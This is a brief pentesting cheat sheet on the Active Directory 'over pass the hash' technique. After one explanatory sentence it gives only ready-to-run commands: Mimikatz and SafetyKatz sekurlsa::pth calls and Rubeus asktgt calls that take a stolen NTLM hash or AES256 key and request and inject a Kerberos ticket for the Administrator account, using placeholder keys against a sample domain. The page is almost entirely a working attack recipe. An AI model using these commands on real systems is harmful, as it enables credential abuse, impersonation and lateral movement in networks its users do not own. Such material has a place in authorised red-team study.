# Over Pass The Hash

Over pass the hash (OPTH) is used between domain joined and not passing directly the NTLM hash to authenticate, instead asking for TGT.

<pre class="language-powershell" data-overflow="wrap" data-full-width="false"><code class="lang-powershell"><strong>Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:&#x3C;aes256key> /run:powershell.exe"'
</strong>
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:&#x3C;aes256keys>  /run:cmd.exe" "exit"

Rubeus.exe asktgt /user:administrator /rc4:&#x3C;ntlmhash> /ptt

Rubeus.exe asktgt /user:administrator /aes256:&#x3C;aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
</code></pre>
